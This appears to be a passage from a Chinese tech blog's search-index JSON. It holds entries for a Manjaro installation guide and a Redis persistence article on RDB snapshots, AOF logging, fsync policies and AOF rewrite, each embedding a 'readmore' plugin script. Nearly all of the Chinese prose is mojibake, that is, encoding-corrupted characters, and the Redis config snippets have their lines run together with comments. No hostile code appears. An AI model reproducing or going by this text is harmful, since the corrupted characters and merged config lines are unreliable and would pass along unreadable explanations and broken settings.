"Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"Manjaro å®‰è£…å›¾è§£æ•™ç¨‹",url:"/posts/eadad846.html",text:'å®˜æ–¹æ¡Œé¢ç¯å¢ƒæ¯”è¾ƒ XFCE èµ„æºå ç”¨å°‘ï¼Œç¨³å®š GNOME å®šåˆ¶æ€§å·®ï¼Œèµ„æºå ç”¨ä¸­ç­‰ KDE å®šåˆ¶æ€§é«˜ï¼Œèµ„æºå ç”¨å¤šï¼Œè¿è¡Œæ¯”è¾ƒå¡ å®˜æ–¹æ¡Œé¢ç¯å¢ƒå›¾ ç¤¾åŒºæ¡Œé¢ç¯å¢ƒå›¾ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"manjaro"},{title:"æµ…è°ˆ Redis æŒä¹…åŒ– - RDB å’Œ AOF åŸç†",url:"/posts/b9abccfa.html",text:'æŒä¹…åŒ–ä»€ä¹ˆæ˜¯æŒä¹…åŒ–æŒä¹…åŒ–ï¼ˆPersistenceï¼‰ï¼Œå³æŠŠæ•°æ®ï¼ˆå¦‚å†…å­˜ä¸­çš„å¯¹è±¡ï¼‰ä¿å­˜åˆ°å¯æ°¸ä¹…ä¿å­˜çš„å­˜å‚¨è®¾å¤‡ä¸­ï¼ˆå¦‚ç£ç›˜ï¼‰ã€‚ æŒä¹…åŒ–çš„å®ç°æ–¹å¼ å¿«ç…§æ–¹å¼æŒä¹…åŒ–ï¼šåœ¨æŸæ—¶åˆ»æŠŠæ‰€æœ‰æ•°æ®è¿›è¡Œå®Œæ•´å¤‡ä»½ï¼Œä¾‹å¦‚ï¼šMySQL çš„ Dump æ–¹å¼ã€Redis çš„ RDB æ–¹å¼ å†™æ—¥å¿—æ–¹å¼æŒä¹…åŒ–ï¼šæŠŠç”¨æˆ·æ‰§è¡Œçš„æ‰€æœ‰å†™æŒ‡ä»¤ï¼ˆå¢åˆ æ”¹ï¼‰å¤‡ä»½åˆ°æ–‡ä»¶ä¸­ï¼Œè¿˜åŸæ•°æ®æ—¶åªéœ€è¦æŠŠå¤‡ä»½çš„æ‰€æœ‰æŒ‡ä»¤é‡æ–°æ‰§è¡Œä¸€éå³å¯ï¼Œä¾‹å¦‚ï¼šMySQL çš„ Binlogã€Redis çš„ AOFã€Hbase çš„ HLog RDBRDB ä»‹ç»RDB æŒä¹…åŒ–æ–¹å¼æ˜¯åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…å°†å†…å­˜ä¸­çš„æ•°æ®é›†å¿«ç…§å†™å…¥ç£ç›˜ï¼ˆpoint-in-time snapshotï¼‰ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedis å°†æ•°æ®åº“å¿«ç…§ä¿å­˜åœ¨åå­—ä¸º dump.rdb çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚åœ¨ Redis è¿è¡Œæ—¶ï¼ŒRDB ç¨‹åºå°†å½“å‰å†…å­˜ä¸­çš„æ•°æ®åº“å¿«ç…§ä¿å­˜åˆ°ç£ç›˜æ–‡ä»¶ä¸­ï¼Œåœ¨ Redis é‡å¯åŠ¨æ—¶ï¼ŒRDB ç¨‹åºå¯ä»¥é€šè¿‡è½½å…¥ RDB æ–‡ä»¶æ¥è¿˜åŸæ•°æ®åº“çš„çŠ¶æ€ã€‚ RDB å·¥ä½œåŸç†å½“ Redis éœ€è¦ä¿å­˜ dump.rdb äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œã€‚æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼ŒRedis çš„ä¸»è¿›ç¨‹ä¸è¿›è¡Œä»»ä½• I/O æ“ä½œï¼Œè¿™å°±ç¡®ä¿äº†æé«˜çš„æ€§èƒ½ï¼Œä½¿ Redis å¯ä»¥ä»å†™æ—¶å¤åˆ¶ï¼ˆcopy-on-writeï¼‰æœºåˆ¶ä¸­è·ç›Šã€‚ Redis å•ç‹¬åˆ›å»ºï¼ˆforkï¼‰ä¸€ä¸ªå­è¿›ç¨‹ å­è¿›ç¨‹å°†å†…å­˜ä¸­çš„æ•°æ®é›†å†™å…¥åˆ°ä¸€ä¸ªä¸´æ—¶ RDB æ–‡ä»¶ä¸­ å½“å­è¿›ç¨‹å®Œæˆå¯¹ä¸´æ—¶ RDB æ–‡ä»¶çš„å†™å…¥æ—¶ï¼ŒRedis ç”¨ä¸´æ—¶ RDB æ–‡ä»¶æ›¿æ¢æ—§çš„ RDB æ–‡ä»¶ï¼Œå¹¶åˆ é™¤æ—§çš„ RDB æ–‡ä»¶ RDB çš„ä¸‰ç§ä¸»è¦è§¦å‘æœºåˆ¶save å‘½ä»¤ï¼ˆåŒæ­¥ï¼‰save å‘½ä»¤ä¼šæ‰§è¡Œä¸€ä¸ªåŒæ­¥æ“ä½œï¼Œä»¥ RDB æ–‡ä»¶çš„æ–¹å¼ä¿å­˜æ‰€æœ‰æ•°æ®çš„å¿«ç…§ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œç”±äº save å‘½ä»¤æ˜¯åŒæ­¥å‘½ä»¤ï¼Œä¼šå ç”¨ Redis çš„ä¸»è¿›ç¨‹ï¼Œè‹¥ Redis çš„æ•°æ®é‡éå¸¸å¤§æ—¶ï¼Œsave å‘½ä»¤æ‰§è¡Œé€Ÿåº¦ä¼šéå¸¸æ…¢ï¼Œä¼šé˜»å¡æ‰€æœ‰å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å› æ­¤å¾ˆå°‘åœ¨ç”Ÿäº§ç¯å¢ƒç›´æ¥ä½¿ç”¨ save å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ bgsave å‘½ä»¤ä»£æ›¿ã€‚å¦‚æœ bgsave å‘½ä»¤çš„ä¿å­˜æ•°æ®çš„å­è¿›ç¨‹å‘ç”Ÿé”™è¯¯ï¼Œå¯¼è‡´æ— æ³•å¤‡ä»½æ—¶ï¼Œé‚£ä¹ˆç”¨ save å‘½ä»¤ä¿å­˜æœ€æ–°çš„æ•°æ®æ˜¯æœ€åçš„æ‰‹æ®µã€‚ bgsave å‘½ä»¤ï¼ˆå¼‚æ­¥ï¼‰Redis ä½¿ç”¨ Linux ç³»ç»Ÿçš„ fock() ç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹æ¥å°†æ•°æ®åº“æ•°æ®ä¿å­˜åˆ°ç£ç›˜ï¼Œä¸»è¿›ç¨‹ç»§ç»­æä¾›æœåŠ¡ä»¥ä¾›å®¢æˆ·ç«¯è°ƒç”¨ã€‚å¦‚æœæ“ä½œæˆåŠŸï¼Œå¯ä»¥é€šè¿‡å®¢æˆ·ç«¯å‘½ä»¤ LASTSAVE æ¥æ£€æŸ¥æ“ä½œç»“æœã€‚ save å‘½ä»¤ä¸ bgsave å‘½ä»¤å¯¹æ¯”å¦‚ä¸‹ï¼Œç‰¹åˆ«æ³¨æ„ï¼Œshutdownã€slave å‘½ä»¤ä¹Ÿä¼šè§¦å‘æ•°æ®å¿«ç…§çš„åˆ›å»º è‡ªåŠ¨ç”Ÿæˆ RDB æ–‡ä»¶é™¤äº†æ‰‹åŠ¨æ‰§è¡Œ save å’Œ bgsave å‘½ä»¤å®ç° RDB æŒä¹…åŒ–ä»¥å¤–ï¼ŒRedis è¿˜æä¾›äº†è‡ªåŠ¨è‡ªåŠ¨ç”Ÿæˆ RDB æ–‡ä»¶çš„æ–¹å¼ã€‚é€šè¿‡é…ç½®æ–‡ä»¶å¯¹ Redis è¿›è¡Œè®¾ç½®ï¼Œè®©å®ƒåœ¨ â€œN ç§’å†…æ•°æ®é›†è‡³å°‘æœ‰ M ä¸ªæ”¹åŠ¨â€ è¿™ä¸€æ¡ä»¶è¢«æ»¡è¶³æ—¶ï¼Œè‡ªåŠ¨è¿›è¡Œæ•°æ®é›†ä¿å­˜æ“ä½œã€‚æ¯”å¦‚è¯´ï¼Œä»¥ä¸‹è®¾ç½®ä¼šè®© Redis åœ¨æ»¡è¶³ â€œ60 ç§’å†…æœ‰è‡³å°‘æœ‰ 1000 ä¸ªé”®è¢«æ”¹åŠ¨â€ è¿™ä¸€æ¡ä»¶æ—¶ï¼Œè‡ªåŠ¨è¿›è¡Œæ•°æ®é›†ä¿å­˜æ“ä½œï¼š 1save 60 1000 RDB ç›¸å…³é…ç½®12345678910111213141516171819202122232425# RDBè‡ªåŠ¨æŒä¹…åŒ–è§„åˆ™# å½“ 900 ç§’å†…æœ‰è‡³å°‘æœ‰ 1 ä¸ªé”®è¢«æ”¹åŠ¨æ—¶ï¼Œè‡ªåŠ¨è¿›è¡Œæ•°æ®é›†ä¿å­˜æ“ä½œsave 900 1# å½“ 300 ç§’å†…æœ‰è‡³å°‘æœ‰ 10 ä¸ªé”®è¢«æ”¹åŠ¨æ—¶ï¼Œè‡ªåŠ¨è¿›è¡Œæ•°æ®é›†ä¿å­˜æ“ä½œsave 300 10# å½“ 60 ç§’å†…æœ‰è‡³å°‘æœ‰ 10000 ä¸ªé”®è¢«æ”¹åŠ¨æ—¶ï¼Œè‡ªåŠ¨è¿›è¡Œæ•°æ®é›†ä¿å­˜æ“ä½œsave 60 10000# RDBæŒä¹…åŒ–æ–‡ä»¶ådbfilename dump-&lt;port&gt;.rdb# æ•°æ®æŒä¹…åŒ–æ–‡ä»¶å­˜å‚¨ç›®å½•dir /var/lib/redis# bgsaveå‘ç”Ÿé”™è¯¯æ—¶æ˜¯å¦åœæ­¢å†™å…¥ï¼Œé€šå¸¸ä¸ºyesstop-writes-on-bgsave-error yes# rdbæ–‡ä»¶æ˜¯å¦ä½¿ç”¨å‹ç¼©æ ¼å¼rdbcompression yes# æ˜¯å¦å¯¹rdbæ–‡ä»¶è¿›è¡Œæ ¡éªŒå’Œæ£€éªŒï¼Œé€šå¸¸ä¸ºyesrdbchecksum yes RDB çš„ä¼˜ç‚¹ RDB æ˜¯ä¸€ä¸ªéå¸¸ç´§å‡‘çš„æ–‡ä»¶ï¼Œå®ƒä¿å­˜äº†æŸä¸ªæ—¶é—´ç‚¹çš„æ•°æ®é›†ï¼Œéå¸¸é€‚ç”¨äºæ•°æ®é›†çš„å¤‡ä»½ï¼Œæ¯”å¦‚å¯ä»¥åœ¨æ¯ä¸ªå°æ—¶ä¿å­˜ä¸€ä¸‹è¿‡å» 24 å°æ—¶å†…çš„æ•°æ®ï¼ŒåŒæ—¶æ¯å¤©ä¿å­˜è¿‡å» 30 å¤©çš„æ•°æ®ï¼Œè¿™æ ·å³ä½¿å‡ºäº†é—®é¢˜ä¹Ÿå¯ä»¥æ ¹æ®éœ€æ±‚æ¢å¤åˆ°ä¸åŒç‰ˆæœ¬çš„æ•°æ®é›†ï¼Œéå¸¸é€‚åˆåšå†·å¤‡ RDB æ˜¯ä¸€ä¸ªç´§å‡‘çš„å•ä¸€æ–‡ä»¶ï¼Œå¾ˆæ–¹ä¾¿ä¼ é€åˆ°å¦ä¸€ä¸ªè¿œç«¯æ•°æ®ä¸­å¿ƒæˆ–è€…äºšé©¬é€Šçš„ S3ï¼ˆå¯èƒ½åŠ å¯†ï¼‰ï¼Œéå¸¸é€‚ç”¨äºç¾éš¾æ¢å¤ RDB åœ¨ä¿å­˜ RDB æ–‡ä»¶æ—¶ï¼Œçˆ¶è¿›ç¨‹å”¯ä¸€éœ€è¦åšçš„å°±æ˜¯ fork å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ¥ä¸‹æ¥çš„å·¥ä½œå…¨éƒ¨ç”±å­è¿›ç¨‹æ¥åšï¼Œçˆ¶è¿›ç¨‹ä¸éœ€è¦å†åšå…¶ä»– I/O æ“ä½œï¼Œæ‰€ä»¥ RDB æŒä¹…åŒ–æ–¹å¼å¯ä»¥æœ€å¤§åŒ–åœ°æé«˜ Redis çš„æ€§èƒ½ è‹¥éœ€è¦è¿›è¡Œå¤§è§„æ¨¡æ•°æ®çš„æ¢å¤ï¼Œä¸”å¯¹äºæ•°æ®æ¢å¤çš„å®Œæ•´æ€§ä¸æ˜¯éå¸¸æ•æ„Ÿï¼Œé‚£ä¹ˆ RDB æ–¹å¼è¦æ¯” AOF æ–¹å¼çš„æ•°æ®æ¢å¤é€Ÿåº¦æ›´å¿« RDB çš„ç¼ºç‚¹ è€—æ—¶ã€è€—æ€§èƒ½ï¼šRDB éœ€è¦ç»å¸¸ fork å­è¿›ç¨‹æ¥ä¿å­˜æ•°æ®é›†åˆ°ç¡¬ç›˜ä¸Šï¼Œå½“æ•°æ®é›†æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼Œfork çš„è¿‡ç¨‹æ˜¯éå¸¸è€—æ—¶çš„ï¼Œå¯èƒ½ä¼šå¯¼è‡´ Redis åœ¨æ¯«ç§’çº§å†…ä¸èƒ½å“åº”å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å¦‚æœæ•°æ®é›†å·¨å¤§å¹¶ä¸” CPU æ€§èƒ½ä¸æ˜¯å¾ˆå¥½çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æƒ…å†µå¯èƒ½ä¼šæŒç»­æ•°æ¯«ç§’æˆ–è€…å‡ ç§’ï¼ŒAOF ä¹Ÿéœ€è¦ forkï¼Œä½†å¯ä»¥è°ƒèŠ‚é‡å†™æ—¥å¿—æ–‡ä»¶çš„é¢‘ç‡æ¥æé«˜æ•°æ®é›†çš„è€ä¹…åº¦ ä¸å¯æ§ã€ä¸¢å¤±æ•°æ®ï¼šå¦‚æœå¸Œæœ›åœ¨ Redis æ„å¤–åœæ­¢å·¥ä½œï¼ˆä¾‹å¦‚æœºæˆ¿æ–­ç”µï¼‰çš„æƒ…å†µä¸‹å°½é‡å‡å°‘æ•°æ®çš„ä¸¢å¤±ï¼Œé‚£ä¹ˆ RDB ä¸é€‚åˆè¿™ç§åœºæ™¯ã€‚è™½ç„¶å¯ä»¥é…ç½®ä¸åŒçš„ save æ—¶é—´ç‚¹ï¼ˆä¾‹å¦‚æ¯éš” 5 åˆ†é’Ÿä¸”å¯¹æ•°æ®é›†æœ‰ 100 ä¸ªå†™çš„æ“ä½œæ—¶è¿›è¡Œå¤‡ä»½)ï¼Œä½† Redis è¦å®Œæ•´çš„ä¿å­˜æ•´ä¸ªæ•°æ®é›†æ˜¯ä¸€ä¸ªæ¯”è¾ƒç¹é‡çš„å·¥ä½œï¼Œé€šå¸¸ä¼šæ¯éš” 5 åˆ†é’Ÿæˆ–è€…æ›´ä¹…åšä¸€æ¬¡å®Œæ•´çš„ä¿å­˜ï¼Œä¸‡ä¸€åœ¨ Redis æ„å¤–å®•æœºï¼Œå¯èƒ½ä¼šä¸¢å¤±å‡ åˆ†é’Ÿçš„æ•°æ®ã€‚ç®€å•æ¥è¯´ï¼Œæœ€åä¸€æ¬¡ RDB æŒä¹…åŒ–åçš„æ•°æ®å¯èƒ½ä¼šä¸¢å¤±ã€‚ AOFAOF ä»‹ç»å¿«ç…§åŠŸèƒ½ï¼ˆRDBï¼‰å¹¶ä¸æ˜¯éå¸¸è€ä¹…ï¼ˆdurableï¼‰ï¼Œå¦‚æœ Redis å› ä¸ºæŸäº›åŸå› è€Œé€ æˆæ•…éšœåœæœºï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°†ä¸¢å¤±æœ€è¿‘å†™å…¥ä¸”ä»æœªä¿å­˜åˆ°å¿«ç…§ä¸­çš„é‚£äº›æ•°æ®ã€‚ ä» 1.1 ç‰ˆæœ¬å¼€å§‹ï¼ŒRedis å¢åŠ äº†ä¸€ç§å®Œå…¨è€ä¹…çš„æŒä¹…åŒ–æ–¹å¼ï¼Œé‚£å°±æ˜¯ AOF æŒä¹…åŒ–ã€‚AOF ä»¥æ—¥å¿—çš„å½¢å¼æ¥è®°å½•æ¯ä¸ªå†™æ“ä½œï¼Œå°† Redis æ‰§è¡Œè¿‡çš„æ‰€æœ‰å†™æŒ‡ä»¤è®°å½•ä¸‹æ¥ï¼ŒåŒæ—¶åªè®¸è¿½åŠ æ–‡ä»¶ä¸èƒ½æ”¹å†™æ–‡ä»¶ã€‚åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨ AOFï¼ˆå¦‚ä¸‹é…ç½®ï¼‰ åï¼Œæ¯å½“ Redis æ‰§è¡Œä¸€ä¸ªæ”¹å˜æ•°æ®é›†çš„å‘½ä»¤æ—¶ï¼ˆæ¯”å¦‚ SETï¼‰ï¼Œè¿™ä¸ªå‘½ä»¤å°±ä¼šè¢«è¿½åŠ åˆ° AOF æ–‡ä»¶çš„æœ«å°¾ã€‚è¿™æ ·çš„è¯ï¼Œå½“ Redis é‡æ–°å¯æ—¶ï¼Œç¨‹åºå°±å¯ä»¥é€šè¿‡é‡æ–°æ‰§è¡Œ AOF æ–‡ä»¶ä¸­çš„å‘½ä»¤æ¥è¾¾åˆ°é‡å»ºæ•°æ®é›†çš„ç›®çš„ã€‚ 1appendonly yes AOF è¿è¡ŒåŸç†AOF è¿è¡ŒåŸç†ï¼ˆåˆ›å»ºä¸æ¢å¤ï¼‰å¦‚ä¸‹ï¼š AOF æŒä¹…åŒ–çš„ä¸‰ç§åŒæ­¥ç­–ç•¥å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶é…ç½® Redis å¤šä¹…æ‰å°†å‘½ä»¤ fsync åˆ°ç£ç›˜ä¸€æ¬¡ï¼ŒRedis æä¾›äº†ä»¥ä¸‹ä¸‰ç§ç­–ç•¥ã€‚ alwaysï¼šæ¯æ¬¡æœ‰æ–°å‘½ä»¤éœ€è¦è¿½åŠ åˆ° AOF æ–‡ä»¶æ—¶å°±æ‰§è¡Œä¸€æ¬¡ fsync æ“ä½œï¼Œéå¸¸æ…¢ï¼Œä¹Ÿéå¸¸å®‰å…¨ everysecï¼šæ¯ç§’ fsync ä¸€æ¬¡ï¼Œé€Ÿåº¦è¶³å¤Ÿå¿«ï¼ˆå’Œä½¿ç”¨ RDB æŒä¹…åŒ–å·®ä¸å¤šï¼‰ï¼Œå¹¶ä¸”åœ¨æ•…éšœæ—¶åªä¼šä¸¢å¤± 1 ç§’é’Ÿçš„æ•°æ®ï¼Œæ¨èï¼ˆå¹¶ä¸”ä¹Ÿæ˜¯é»˜è®¤ï¼‰çš„é…ç½®ä¸ºæ¯ç§’ fsync ä¸€æ¬¡ï¼Œ è¿™ç§ fsync ç­–ç•¥å¯ä»¥å…¼é¡¾é€Ÿåº¦å’Œå®‰å…¨æ€§ã€‚ noï¼šä»ä¸ fsyncï¼Œå°†æ•°æ®äº¤ç»™æ“ä½œç³»ç»Ÿæ¥å¤„ç†ï¼Œç”±æ“ä½œç³»ç»Ÿæ¥å†³å®šä»€ä¹ˆæ—¶å€™åŒæ­¥æ•°æ®ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œä½†ä¹Ÿæ›´ä¸å®‰å…¨ alwaysã€everysecã€no ä¸‰ç§ç­–ç•¥çš„å¯¹æ¯”å¦‚ä¸‹ï¼š AOF é‡å†™AOF é‡å†™ä»‹ç»å› ä¸º AOF çš„è¿ä½œæ–¹å¼æ˜¯ä¸æ–­åœ°å°†å‘½ä»¤è¿½åŠ åˆ°æ–‡ä»¶çš„æœ«å°¾ï¼Œæ‰€ä»¥éšç€å†™å…¥å‘½ä»¤çš„ä¸æ–­å¢åŠ ï¼ŒAOF æ–‡ä»¶çš„ä½“ç§¯ä¹Ÿä¼šå˜å¾—è¶Šæ¥è¶Šå¤§ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœå¯¹ä¸€ä¸ªè®¡æ•°å™¨è°ƒç”¨äº† 100 æ¬¡ INCR ï¼Œé‚£ä¹ˆä»…ä»…æ˜¯ä¸ºäº†ä¿å­˜è¿™ä¸ªè®¡æ•°å™¨çš„å½“å‰å€¼ï¼ŒAOF æ–‡ä»¶å°±éœ€è¦ä½¿ç”¨ 100 æ¡è®°å½•ï¼ˆentryï¼‰ã€‚ç„¶è€Œåœ¨å®é™…ä¸Šï¼Œåªä½¿ç”¨ä¸€æ¡ SET å‘½ä»¤å·²ç»è¶³ä»¥ä¿å­˜è®¡æ•°å™¨çš„å½“å‰å€¼äº†ï¼Œå…¶ä½™ 99 æ¡è®°å½•å®é™…ä¸Šéƒ½æ˜¯å¤šä½™çš„ã€‚ä¸ºäº†å¤„ç†è¿™ç§æƒ…å†µï¼Œ Redis æ”¯æŒä¸€ç§æœ‰è¶£çš„ç‰¹æ€§ï¼Œå¯ä»¥åœ¨ä¸æ‰“æ–­æœåŠ¡å®¢æˆ·ç«¯çš„æƒ…å†µä¸‹ï¼Œå¯¹ AOF æ–‡ä»¶è¿›è¡Œé‡å»ºï¼ˆrebuildï¼‰ã€‚æ‰§è¡Œ bgrewriteaof å‘½ä»¤ï¼ŒRedis å°†ç”Ÿæˆä¸€ä¸ªæ–°çš„ AOF æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«é‡å»ºå½“å‰æ•°æ®é›†æ‰€éœ€çš„æœ€å°‘å‘½ä»¤ã€‚Redis 2.2 éœ€è¦è‡ªå·±æ‰‹åŠ¨æ‰§è¡Œ bgrewriteaof å‘½ä»¤ï¼Œè€Œ Redis 2.4 ä¹‹ååˆ™å¯ä»¥é€šè¿‡é…ç½®è‡ªåŠ¨è§¦å‘ AOF é‡å†™ã€‚é€šè¿‡ AOF é‡å†™ï¼Œå¯ä»¥å‡å°‘ç£ç›˜å ç”¨é‡ã€åŠ é€Ÿæ•°æ®æ¢å¤ï¼ŒAOF é‡å†™çš„å¯¹æ¯”å›¾å¦‚ä¸‹ï¼š AOF é‡å†™çš„å®ç°æ–¹å¼bgrewriteaof å‘½ä»¤ Redis çš„ bgrewriteaof å‘½ä»¤ç”¨äºå¼‚æ­¥æ‰§è¡Œä¸€ä¸ª AOFï¼ˆAppend Only Fileï¼‰æ–‡ä»¶é‡å†™æ“ä½œï¼Œé‡å†™åä¼šåˆ›å»ºä¸€ä¸ªå½“å‰ AOF æ–‡ä»¶çš„ä½“ç§¯ä¼˜åŒ–ç‰ˆæœ¬ã€‚å³ä½¿ bgrewriteaof å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•æ•°æ®ä¸¢å¤±ï¼Œå› ä¸ºæ—§çš„ AOF æ–‡ä»¶åœ¨ bgrewriteaof å‘½ä»¤æ‰§è¡ŒæˆåŠŸä¹‹å‰ä¸ä¼šè¢«ä¿®æ”¹ã€‚AOF é‡å†™æ“ä½œç”± Redis è‡ªè¡Œè§¦å‘ï¼Œbgrewriteaof å‘½ä»¤ä»…ä»…ç”¨äºæ‰‹åŠ¨è§¦å‘ AOF é‡å†™æ“ä½œï¼Œæ•´ä¸ªæµç¨‹å¦‚ä¸‹ï¼š å¦‚æœä¸€ä¸ªå­è¿›ç¨‹æ˜¯ Redis é€šè¿‡ç£ç›˜å¿«ç…§åˆ›å»ºçš„ï¼Œé‚£ä¹ˆ AOF é‡å†™å°†ä¼šåœ¨ RDB æ“ä½œç»ˆæ­¢åæ‰å¼€å§‹ä¿å­˜ï¼Œè¿™ç§æƒ…å†µä¸‹ bgrewriteaof å‘½ä»¤ä¾ç„¶ä¼šè¿”å› OK çŠ¶æ€ç ã€‚ä» Redis 2.6 èµ·ï¼Œå¯ä»¥é€šè¿‡ info å‘½ä»¤æŸ¥çœ‹ AOF é‡å†™çš„æ‰§è¡Œæƒ…å†µ å¦‚æœæ­£åœ¨æ‰§è¡Œçš„ AOF é‡å†™æ“ä½œè¿”å›äº†ä¸€ä¸ªé”™è¯¯ï¼Œé‚£ä¹ˆ AOF é‡å†™å°†ä¼šåœ¨ç¨åä¸€ç‚¹çš„æ—¶é—´é‡æ–°æ‰§è¡Œ AOF é‡å†™é…ç½® AOF é‡å†™è‡ªåŠ¨è§¦å‘çš„æ¡ä»¶ Redis æ”¯æŒ AOF é‡å†™è‡ªåŠ¨è§¦å‘æœºåˆ¶ï¼Œæ— éœ€æ‰‹åŠ¨æ‰§è¡Œ bgrewriteaof å‘½ä»¤ï¼Œä½†éœ€è¦åŒæ—¶æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶æ‰ä¼šè‡ªåŠ¨è§¦å‘ï¼š aof_current_size &gt; auto-aof-rewrite-min-size (aof_current_size - aof_base_size) * 100 / aof_base_size &gt; auto-aof-rewrite-percentage 12auto-aof-rewrite-min-size 64mbauto-aof-rewrite-percentage 100 å‡è®¾ Redis çš„é…ç½®å¦‚ä¸Šï¼Œå½“ AOF æ–‡ä»¶çš„ä½“ç§¯å¤§äº 64Mbï¼Œå¹¶ä¸” AOF æ–‡ä»¶çš„ä½“ç§¯æ¯”ä¸Šä¸€æ¬¡é‡å†™æ—¶çš„ä½“ç§¯å¤§äº†è‡³å°‘ä¸€å€ï¼ˆ100%ï¼‰æ—¶ï¼ŒRedis å°†æ‰§è¡Œ bgrewriteaof å‘½ä»¤è¿›è¡Œé‡å†™ã€‚ AOF é‡å†™çš„æµç¨‹Redis é¦–å…ˆ fork å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹å¼€å§‹å°†æ–° AOF æ–‡ä»¶çš„å†…å®¹å†™å…¥åˆ°ä¸´æ—¶æ–‡ä»¶ã€‚å¯¹äºæ‰€æœ‰æ–°æ‰§è¡Œçš„å†™å…¥å‘½ä»¤ï¼Œçˆ¶è¿›ç¨‹ä¸€è¾¹å°†å®ƒä»¬ç´¯ç§¯åˆ°ä¸€ä¸ªå†…å­˜ç¼“å­˜ä¸­ï¼Œä¸€è¾¹å°†è¿™äº›æ”¹åŠ¨è¿½åŠ åˆ°ç°æœ‰ AOF æ–‡ä»¶çš„æœ«å°¾ï¼Œè¿™æ ·å³ä½¿åœ¨é‡å†™çš„ä¸­é€”å‘ç”Ÿå®•æœºï¼Œç°æœ‰çš„ AOF æ–‡ä»¶ä¹Ÿè¿˜æ˜¯å®‰å…¨çš„ã€‚å½“å­è¿›ç¨‹å®Œæˆé‡å†™å·¥ä½œæ—¶ï¼Œå®ƒç»™çˆ¶è¿›ç¨‹å‘é€ä¸€ä¸ªä¿¡å·ï¼Œçˆ¶è¿›ç¨‹åœ¨æ¥æ”¶åˆ°ä¿¡å·ä¹‹åï¼Œå°†å†…å­˜ç¼“å­˜ä¸­çš„æ‰€æœ‰æ•°æ®è¿½åŠ åˆ°æ–° AOF æ–‡ä»¶çš„æœ«å°¾ã€‚æœ€å Redis åŸå­åœ°ç”¨æ–° AOF æ–‡ä»¶æ›¿æ¢æ—§ AOF æ–‡ä»¶ï¼Œä¹‹åæ‰€æœ‰å‘½ä»¤éƒ½ä¼šç›´æ¥è¿½åŠ åˆ°æ–° AOF æ–‡ä»¶çš„æœ«å°¾ã€‚ AOF ç›¸å…³é…ç½®1234567891011121314151617181920# å¼€å¯AOFæŒä¹…åŒ–æ–¹å¼appendonly yes# AOFæŒä¹…åŒ–æ–‡ä»¶åappendfilename appendonly-&lt;port&gt;.aof# æ¯ç§’æŠŠç¼“å†²åŒºçš„æ•°æ®åŒæ­¥åˆ°ç£ç›˜appendfsync everysec# æ•°æ®æŒä¹…åŒ–æ–‡ä»¶å­˜å‚¨ç›®å½•dir /var/lib/redis# æ˜¯å¦åœ¨æ‰§è¡Œé‡å†™æ—¶ä¸åŒæ­¥æ•°æ®åˆ°AOFæ–‡ä»¶no-appendfsync-on-rewrite yes# è§¦å‘AOFæ–‡ä»¶æ‰§è¡Œé‡å†™çš„æœ€å°å°ºå¯¸auto-aof-rewrite-min-size 64mb# è§¦å‘AOFæ–‡ä»¶æ‰§è¡Œé‡å†™çš„å¢é•¿ç‡auto-aof-rewrite-percentage 100 AOF çš„ä¼˜ç‚¹ ä½¿ç”¨ AOF ä¼šè®© Redis æ›´åŠ è€ä¹…ï¼šå¯ä»¥ä½¿ç”¨ä¸åŒçš„ fsync ç­–ç•¥ï¼šæ—  fsyncã€æ¯ç§’ fsyncã€æ¯æ¬¡å†™çš„æ—¶å€™ fsyncã€‚ä½¿ç”¨é»˜è®¤çš„æ˜¯æ¯ç§’ fsync ç­–ç•¥ï¼ŒRedis çš„æ€§èƒ½ä¾ç„¶å¾ˆå¥½ï¼ˆfsync æ˜¯ç”±åå°å­è¿›ç¨‹è¿›è¡Œå¤„ç†çš„ï¼Œä¸»çº¿ç¨‹ä¼šå°½åŠ›å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼‰ï¼Œä¸€æ—¦å‡ºç°æ•…éšœï¼Œæœ€å¤šä¸¢å¤± 1 ç§’çš„æ•°æ® AOF å¯¹æ—¥å¿—æ–‡ä»¶çš„å†™å…¥æ“ä½œé‡‡ç”¨çš„æ˜¯ append æ¨¡å¼ï¼Œå› 